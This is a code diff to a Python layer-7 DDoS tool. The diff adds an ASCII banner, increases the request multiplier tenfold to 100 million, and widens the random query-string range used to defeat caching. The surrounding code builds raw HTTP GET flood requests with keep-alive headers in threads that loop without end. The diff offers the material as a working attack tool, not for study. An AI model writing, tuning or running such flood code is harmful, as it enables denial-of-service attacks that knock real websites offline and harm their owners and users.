@@ -11,7 +11,7 @@ from os import system
 from sys import stdout
 from scapy.all import *
 from random import randint
-os.system('cls')
+os.system('pip3 install requests urllib3')
 
 urllib3.disable_warnings()
 urllib3.PoolManager()
@@ -24,8 +24,23 @@ acceptall = [""]
 
 
 def logo():
-    os.system('pip3 install requests urllib3')
-    print("")
+    os.system('TOOL DDOS PYTHON LAYER7-METHODS')
+    print ('''
+     _                        ______      __  __      _   _               _  _____ 
+
+| |                      |____  |    |  \/  |    | | | |             | |/ ____|
+
+| |     __ _ _   _  ___ _ __ / /_____| \  / | ___| |_| |__   ___   __| | (___  
+
+| |    / _` | | | |/ _ \ '__/ /______| |\/| |/ _ \ __| '_ \ / _ \ / _` |\___ \ 
+
+| |___| (_| | |_| |  __/ | / /       | |  | |  __/ |_| | | | (_) | (_| |____) |
+
+|______\__,_|\__, |\___|_|/_/        |_|  |_|\___|\__|_| |_|\___/ \__,_|_____/ 
+
+              __/ |                                                            
+
+             |___/''')
     try:
         print(" Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -153,7 +168,7 @@ def attack():
     x     = int(0)
     error = int(0)
     req_code = int(0)
-    multiple = int(10000000)
+    multiple = int(100000000)
     connection = "Connection: Keep-Alive\r\n"
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
@@ -175,7 +190,7 @@ class Home(threading.Thread):
             get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
             request  = get_host + useragent + accept + content + length + "\r\n"
         else:
-            get_host = 'GET' + " /?=" +str(random.randint(0,20000000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            get_host = 'GET' + " /?=" +str(random.randint(0,200000000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
             request  = get_host + useragent + accept + referer + content + length + "\r\n"
         while True:
             try:
